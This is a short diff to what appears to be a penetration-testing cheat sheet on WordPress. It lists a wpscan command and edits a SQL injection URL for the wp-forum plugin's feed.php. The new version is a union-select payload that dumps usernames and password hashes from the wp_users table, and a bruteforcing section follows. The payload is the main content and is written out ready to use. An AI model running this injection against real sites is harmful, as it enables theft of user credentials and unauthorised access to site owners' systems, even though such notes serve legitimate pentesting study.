@@ -41,7 +41,7 @@ Wordpress
     Scan for known bugs:
     *$ wpscan http://$ip*
     Try exploit:
-    */wp-content/plugins/wp-forum/feed.php?topic=-4381+union+show+databases%23*
+    */wp-content/plugins/wp-forum/feed.php?topic=-4381+union+select+group_concat%28user_login,0x3a,user_pass%29+from+wp_users%23*
 
 Bruteforcing
     Good password list
